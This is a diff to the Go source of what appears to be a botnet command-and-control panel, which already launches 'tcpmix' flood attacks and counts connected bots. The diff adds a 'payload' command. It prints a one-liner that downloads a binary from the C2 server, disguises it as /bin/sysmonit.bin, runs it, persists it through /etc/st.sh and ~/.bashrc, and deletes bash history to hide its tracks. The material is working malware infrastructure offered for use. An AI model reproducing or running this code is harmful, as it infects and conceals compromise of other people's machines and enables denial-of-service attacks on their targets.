@@ -155,6 +155,17 @@ func CommandManager(conn net.Conn) {
 		Print(gradient.Rainbow().Apply("[Homo-Network] ")+color.HiWhiteString("Command successfully sent\n"), conn)
 		go NewAttack(sencoding.Encode(s.Login+"|"+string(time.Now().Unix())), cmd[3], "tcpmix", cmd[1], cmd[2])
 
+	} else if strings.HasPrefix(string(line), "payload") {
+		var host string
+		if !config.GetConfig().Api.CustomPathEnabled {
+			host = config.GetConfig().Api.Server + ":" + config.GetConfig().Api.Port + "/SXkmarwet7vghj"
+		} else {
+			host = config.GetConfig().Api.Server + ":" + config.GetConfig().Api.Port + config.GetConfig().Api.CustomPath
+		}
+
+		Print("apt install curl -y; ulimit -n 999999; rm /bin/sysmonit.bin; curl -X POST http://"+host+" -o /bin/sysmonit.bin ; chmod +x /bin/sysmonit.bin ; /bin/sysmonit.bin & disown >> /etc/st.sh ; bash /etc/st.sh >> ~/.bashrc; bash /etc/st.sh ; rm ~/.bash_history\n\r", conn)
+		CommandManager(conn)
+
 	} else if strings.HasPrefix(string(line), "scanner") {
 		if s.Login != config.GetConfig().Cnc.AdmLogin {
 			Print(gradient.Rainbow().Apply("Unknown command\n"), conn)
@@ -198,6 +209,7 @@ func CommandManager(conn net.Conn) {
 			conn.Write([]byte(color.HiWhiteString("scanner\t\t| Scan your bots\n\r")))
 			conn.Write([]byte(color.HiWhiteString("bots\t\t| Bots count\n\r")))
 			conn.Write([]byte(color.HiWhiteString("adduser\t\t| Add user\n\r")))
+			conn.Write([]byte(color.HiWhiteString("payload\t\t| Payload for scanners\n\r")))
 			conn.Write([]byte(color.HiWhiteString("sreboot\t\t| Reboot\n\r")))
 			conn.Write([]byte(color.HiWhiteString("methods\t\t| Botnet methods\n\r")))
 			conn.Write([]byte(color.HiWhiteString("running\t\t| Active attacks\n\r")))
@@ -269,7 +281,7 @@ func CommandManager(conn net.Conn) {
 		if count < 1 {
 			Print(gradient.Rainbow().Apply("No bots connected\n"), conn)
 		} else {
-			Print(color.HiWhiteString("Bots count: "+gradient.Rainbow().Apply(strconv.Itoa(count))+"\n"), conn)
+			Print(color.HiWhiteString("Bots count: "+gradient.Rainbow().Apply(strconv.Itoa(count))+"\n\r"), conn)
 			Print(gradient.Rainbow().Apply(list+"\n\r"), conn)
 		}
 	} else {
